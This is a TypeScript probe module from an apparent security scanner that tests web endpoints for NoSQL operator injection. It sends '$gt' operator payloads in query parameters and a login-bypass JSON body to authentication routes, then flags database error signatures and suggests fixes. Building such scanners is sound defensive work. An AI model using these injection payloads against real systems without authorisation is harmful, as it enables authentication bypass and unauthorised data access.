import type { RedTeamFinding } from '../types.js';
import type { ProbeContext, SecurityProbeModule } from './types.js';

const NOSQL_ERROR_PATTERNS = [
  { pattern: /(?:MongoError|MongooseError|Cast to ObjectId failed)/i, engine: 'MongoDB/Mongoose' },
  { pattern: /(?:BSONTypeError|can't use \$regex)/i, engine: 'BSON' },
  { pattern: /(?:CouchDB.*error|no_db_file)/i, engine: 'CouchDB' },
];

export const nosqlProbe: SecurityProbeModule = {
  id: 'nosql-injection',
  name: 'NoSQL Operator Injection Boundary Evaluation',
  category: 'nosql-injection',
  defaultSeverity: 'high',
  cwe: 'CWE-943',
  cvssVector: 'CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:N/A:N',
  profiles: ['comprehensive', 'api-logic', 'orchestrated', 'playbook'],

  match: (context: ProbeContext) => {
    return context.endpoints.some((ep) =>
      ep.url.includes('?') ||
      ep.path.includes('/api/') ||
      ['POST', 'PUT'].includes(ep.method) ||
      (ep.parameters && ep.parameters.length > 0)
    );
  },

  run: async (context: ProbeContext): Promise<RedTeamFinding[]> => {
    const findings: RedTeamFinding[] = [];
    const { client, endpoints, options } = context;

    // 1. Query parameter operator injection: ?user[$ne]=null or ?filter[$gt]=
    const queryCandidates = endpoints.filter((ep) => ep.url.includes('?') || (ep.parameters && ep.parameters.length > 0));

    for (const ep of queryCandidates.slice(0, 5)) {
      const parsed = new URL(ep.url);
      const paramNames = Array.from(parsed.searchParams.keys());
      if (paramNames.length === 0 && ep.parameters) {
        for (const p of ep.parameters) paramNames.push(p.name);
      }
      if (paramNames.length === 0) paramNames.push('filter');

      for (const param of paramNames) {
        try {
          const probeUrl = new URL(ep.url);
          // Non-destructive operator test: empty comparison
          probeUrl.searchParams.set(`${param}[$gt]`, '');

          const res = await client.fetchText(probeUrl.toString(), {
            headers: options.authToken ? { Authorization: options.authToken } : {},
            timeoutMs: 2500,
          });

          for (const { pattern, engine } of NOSQL_ERROR_PATTERNS) {
            if (pattern.test(res.text)) {
              findings.push({
                id: `NOSQLI-ERROR-${ep.path.replace(/[^a-zA-Z0-9]/g, '_')}-${param}`,
                title: `NoSQL Injection Syntax Error (${engine}) on parameter '${param}'`,
                category: 'nosql-injection',
                severity: 'high',
                description: `Parameter '${param}' accepted nested query operator '${param}[$gt]' and reflected database error (${engine}), confirming unvalidated NoSQL object passing.`,
                target: probeUrl.toString(),
                evidence: {
                  request: { method: 'GET', url: probeUrl.toString() },
                  response: { status: res.status, snippet: res.text.slice(0, 300) },
                  reproCurl: `curl -i -s "${probeUrl.toString()}"`,
                },
                remediation: 'Sanitize query selectors (e.g., using mongo-sanitize) or enforce strict schema parsing using Zod/Valibot to reject nested operator objects.',
                cwe: 'CWE-943',
                evidenceLevel: 'reproduced',
                confidence: 0.95,
              });
              break;
            }
          }
        } catch {
          // Continue
        }
      }
    }

    // 2. JSON Body operator injection for POST /login or /auth
    const authEndpoints = endpoints.filter((ep) =>
      ep.method === 'POST' && (ep.path.includes('/login') || ep.path.includes('/auth') || ep.path.includes('/signin'))
    );

    for (const ep of authEndpoints.slice(0, 3)) {
      try {
        const res = await client.fetchText(ep.url, {
          method: 'POST',
          headers: { 'Content-Type': 'application/json' },
          body: JSON.stringify({ username: { $gt: '' }, password: { $gt: '' } }),
          timeoutMs: 2500,
        });

        for (const { pattern, engine } of NOSQL_ERROR_PATTERNS) {
          if (pattern.test(res.text)) {
            findings.push({
              id: `NOSQLI-JSON-AUTH-${ep.path.replace(/[^a-zA-Z0-9]/g, '_')}`,
              title: `NoSQL Injection Vulnerability in Authentication (${engine}) on ${ep.path}`,
              category: 'nosql-injection',
              severity: 'critical',
              description: `The authentication route ${ep.path} accepted NoSQL object selectors in JSON body and leaked ${engine} error signatures.`,
              target: ep.url,
              evidence: {
                request: {
                  method: 'POST',
                  url: ep.url,
                  headers: { 'Content-Type': 'application/json' },
                  body: '{"username":{"$gt":""},"password":{"$gt":""}}',
                },
                response: { status: res.status, snippet: res.text.slice(0, 300) },
                reproCurl: `curl -i -s -X POST "${ep.url}" -H "Content-Type: application/json" -d '{"username":{"$gt":""},"password":{"$gt":""}}'`,
              },
              remediation: 'Validate that username and password are strictly strings before querying database.',
              cwe: 'CWE-943',
              evidenceLevel: 'reproduced',
              confidence: 0.98,
            });
            break;
          }
        }
      } catch {
        // Continue
      }
    }

    return findings;
  },
};
